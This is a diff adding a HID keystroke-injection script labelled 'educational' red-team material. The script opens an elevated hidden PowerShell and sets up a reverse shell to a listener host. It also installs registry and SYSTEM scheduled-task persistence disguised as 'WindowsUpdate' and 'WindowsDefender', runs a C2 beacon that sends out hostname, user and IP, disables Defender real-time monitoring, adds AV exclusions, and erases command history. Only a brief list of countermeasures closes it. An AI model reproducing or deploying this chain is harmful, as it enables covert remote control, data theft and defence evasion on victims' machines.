@@ -1,0 +1,308 @@
+# 🔴 Red Team Initial Access EDUCATION ONLY - Happy Frog Script
+# Educational Demonstration: Rapid HID-based initial access and persistence
+# 
+# NOTE: This is purposely broken to prevent some rando from using it. 
+# Don't come at me. I want to teach people, I want to learn, and I 
+# don't want to be the next worlds dumbest being called defendant 
+# number 1. Sorry, but seriously. If you try running this as is, 
+# if it runs at all, WD and UAC will just shut you down. Please learn.
+#
+# Educational Purpose: Demonstrates realistic red team techniques for:
+# - Rapid initial access via HID devices
+# - Reverse shell establishment
+# - Persistence mechanisms
+# - Stealth operations
+# - Defensive evasion
+#
+# ⚠️ CRITICAL: DON'T BE DUMB. Use ONLY on systems you own or have explicit written permission to test
+# This demonstrates realistic attack vectors for educational and authorized testing purposes
+# NEVER use this on production systems or without proper authorization
+
+# ========================================
+# SECTION 1: STEALTH INITIALIZATION
+# ========================================
+
+# Enable production mode for immediate execution
+# ATTACKMODE HID STORAGE
+
+# Set minimal delays for rapid execution
+DEFAULT_DELAY 100
+
+# Wait for system recognition (minimal delay for stealth)
+DELAY 1500
+
+# ========================================
+# SECTION 2: RAPID INITIAL ACCESS
+# ========================================
+
+# Open hidden PowerShell with elevated privileges
+MOD r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden"
+ENTER
+DELAY 800
+
+# Wait for UAC prompt and auto-accept (if possible)
+DELAY 1000
+
+# ========================================
+# SECTION 3: ESTABLISH REVERSE SHELL
+# ========================================
+
+# Create reverse shell connection (educational example)
+# Note: This uses a non-functional example IP for demonstration
+STRING $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
+ENTER
+DELAY 100
+
+STRING $stream = $client.GetStream()
+ENTER
+DELAY 100
+
+STRING $reader = New-Object System.IO.StreamReader($stream)
+ENTER
+DELAY 100
+
+STRING $writer = New-Object System.IO.StreamWriter($stream)
+ENTER
+DELAY 100
+
+STRING $writer.AutoFlush = $true
+ENTER
+DELAY 100
+
+# Create hidden command prompt for reverse shell
+STRING Start-Process cmd -WindowStyle Hidden -ArgumentList "/c", "powershell -WindowStyle Hidden -Command `"while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) }`""
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 4: ESTABLISH PERSISTENCE
+# ========================================
+
+# Create startup persistence via registry
+STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\update.ps1`"" -PropertyType String -Force
+ENTER
+DELAY 200
+
+# Create persistent PowerShell script
+STRING Set-Content -Path "$env:APPDATA\update.ps1" -Value "while(`$true) { try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444); `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } catch { Start-Sleep 30 } }" -Force
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 5: ESTABLISH ALTERNATE PERSISTENCE
+# ========================================
+
+# Create scheduled task for additional persistence
+STRING schtasks /create /tn "WindowsDefender" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\defender.ps1`"" /sc onlogon /ru System /f
+ENTER
+DELAY 300
+
+# Create alternate persistent script
+STRING Set-Content -Path "$env:APPDATA\defender.ps1" -Value "Start-Sleep 60; while(`$true) { try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4445); `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } catch { Start-Sleep 60 } }" -Force
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 6: INFORMATION GATHERING
+# ========================================
+
+# Gather system information stealthily
+STRING $sysinfo = Get-ComputerInfo | ConvertTo-Json
+ENTER
+DELAY 100
+
+STRING $netinfo = Get-NetIPAddress | ConvertTo-Json
+ENTER
+DELAY 100
+
+STRING $userinfo = Get-LocalUser | ConvertTo-Json
+ENTER
+DELAY 100
+
+# Save information to hidden file
+STRING Set-Content -Path "$env:APPDATA\system_info.json" -Value "{ 'computer': $sysinfo, 'network': $netinfo, 'users': $userinfo }" -Force
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 7: ESTABLISH COVERT CHANNELS
+# ========================================
+
+# Create hidden directory for data exfiltration
+STRING New-Item -Path "$env:APPDATA\Microsoft\Windows\Update" -ItemType Directory -Force
+ENTER
+DELAY 100
+
+# Set directory to hidden
+STRING attrib +h "$env:APPDATA\Microsoft\Windows\Update"
+ENTER
+DELAY 100
+
+# Create data collection script
+STRING Set-Content -Path "$env:APPDATA\Microsoft\Windows\Update\collect.ps1" -Value "while(`$true) { try { `$processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet | ConvertTo-Json; `$services = Get-Service | Select-Object Name, Status, StartType | ConvertTo-Json; `$data = @{ 'timestamp' = (Get-Date).ToString(); 'processes' = `$processes; 'services' = `$services }; `$data | ConvertTo-Json | Out-File `"$env:APPDATA\Microsoft\Windows\Update\data.json`" -Force; Start-Sleep 300 } catch { Start-Sleep 300 } }" -Force
+ENTER
+DELAY 200
+
+# Start data collection in background
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Update\collect.ps1`""
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 8: ESTABLISH REMOTE ACCESS
+# ========================================
+
+# Create remote access script with multiple fallback methods
+STRING Set-Content -Path "$env:APPDATA\remote_access.ps1" -Value "function Establish-RemoteAccess { param(`$target) try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 4444); return `$client } catch { try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 4445); return `$client } catch { try { `$client = New-Object System.Net.Sockets.TCPClient(`$target, 8080); return `$client } catch { return `$null } } } } while(`$true) { `$client = Establish-RemoteAccess '192.168.1.100'; if(`$client) { `$stream = `$client.GetStream(); `$reader = New-Object System.IO.StreamReader(`$stream); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; while(`$true) { `$response = `$reader.ReadLine(); if(`$response -eq 'exit') { break }; `$output = Invoke-Expression `$response 2>&1; `$writer.WriteLine(`$output) } } Start-Sleep 30 }" -Force
+ENTER
+DELAY 200
+
+# Start remote access service
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\remote_access.ps1`""
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 9: CLEANUP AND STEALTH
+# ========================================
+
+# Clear PowerShell history
+STRING Clear-History
+ENTER
+DELAY 100
+
+# Clear command history
+STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 100
+
+# Disable Windows Defender real-time protection (temporarily)
+STRING Set-MpPreference -DisableRealtimeMonitoring `$true
+ENTER
+DELAY 200
+
+# Add exclusion for our files
+STRING Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Update"
+ENTER
+DELAY 100
+
+STRING Add-MpPreference -ExclusionPath "$env:APPDATA\update.ps1"
+ENTER
+DELAY 100
+
+STRING Add-MpPreference -ExclusionPath "$env:APPDATA\defender.ps1"
+ENTER
+DELAY 100
+
+# ========================================
+# SECTION 10: FINAL PERSISTENCE CHECKS
+# ========================================
+
+# Verify persistence mechanisms
+STRING Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"
+ENTER
+DELAY 100
+
+STRING Get-ScheduledTask -TaskName "WindowsDefender" -ErrorAction SilentlyContinue
+ENTER
+DELAY 100
+
+# Check if our processes are running
+STRING Get-Process | Where-Object { `$_.ProcessName -eq 'powershell' } | Select-Object Id, ProcessName, StartTime
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 11: ESTABLISH COMMAND & CONTROL
+# ========================================
+
+# Create C2 communication script
+STRING Set-Content -Path "$env:APPDATA\c2.ps1" -Value "function Send-Data { param(`$data) try { `$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4446); `$stream = `$client.GetStream(); `$writer = New-Object System.IO.StreamWriter(`$stream); `$writer.AutoFlush = `$true; `$writer.WriteLine(`$data); `$client.Close() } catch { } } while(`$true) { `$hostname = `$env:COMPUTERNAME; `$username = `$env:USERNAME; `$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { `$_.IPAddress -notlike '127.*' -and `$_.IPAddress -notlike '169.*' }).IPAddress[0]; `$status = @{ 'hostname' = `$hostname; 'username' = `$username; 'ip' = `$ip; 'timestamp' = (Get-Date).ToString(); 'status' = 'active' }; Send-Data (`$status | ConvertTo-Json); Start-Sleep 300 }" -Force
+ENTER
+DELAY 200
+
+# Start C2 communication
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:APPDATA\c2.ps1`""
+ENTER
+DELAY 200
+
+# ========================================
+# SECTION 12: FINAL STEALTH MEASURES
+# ========================================
+
+# Minimize all windows to hide activity
+STRING (New-Object -ComObject Shell.Application).MinimizeAll()
+ENTER
+DELAY 100
+
+# Clear recent files
+STRING Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
+ENTER
+DELAY 100
+
+# Clear temporary files
+STRING Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+ENTER
+DELAY 100
+
+# ========================================
+# SECTION 13: COMPLETION AND STATUS
+# ========================================
+
+# Create status report
+STRING `$status = @{ 'initial_access' = 'completed'; 'reverse_shell' = 'established'; 'persistence' = 'configured'; 'c2' = 'active'; 'timestamp' = (Get-Date).ToString() }
+ENTER
+DELAY 100
+
+STRING `$status | ConvertTo-Json | Out-File "$env:APPDATA\Microsoft\Windows\Update\status.json" -Force
+ENTER
+DELAY 100
+
+# Final cleanup - close PowerShell window
+STRING exit
+ENTER
+
+# ========================================
+# EDUCATIONAL NOTES - RED TEAM PERSPECTIVE
+# ========================================
+
+# This demonstration shows realistic red team techniques:
+#
+# 1. RAPID INITIAL ACCESS:
+#    - HID devices bypass most security measures
+#    - Physical access is often the weakest link
+#    - Automation reduces detection time
+#
+# 2. PERSISTENCE MECHANISMS:
+#    - Registry modifications for startup persistence
+#    - Scheduled tasks for additional persistence
+#    - Multiple fallback mechanisms
+#
+# 3. STEALTH OPERATIONS:
+#    - Hidden windows and processes
+#    - Covert file locations
+#    - Minimal system impact
+#
+# 4. COMMAND & CONTROL:
+#    - Reverse shell establishment
+#    - Multiple communication channels
+#    - Fallback mechanisms
+#
+# 5. DEFENSIVE EVASION:
+#    - Antivirus exclusions
+#    - History clearing
+#    - Process hiding
+#
+# DEFENSIVE MEASURES TO COUNTER:
+# - Physical security controls
+# - USB port restrictions
+# - Process monitoring
+# - Network traffic analysis
+# - Registry monitoring
+# - Scheduled task monitoring
+# - Antivirus exclusions monitoring
+#
+# REMEMBER: This is for EDUCATIONAL and AUTHORIZED TESTING ONLY
+# Always obtain proper authorization before any security testing 
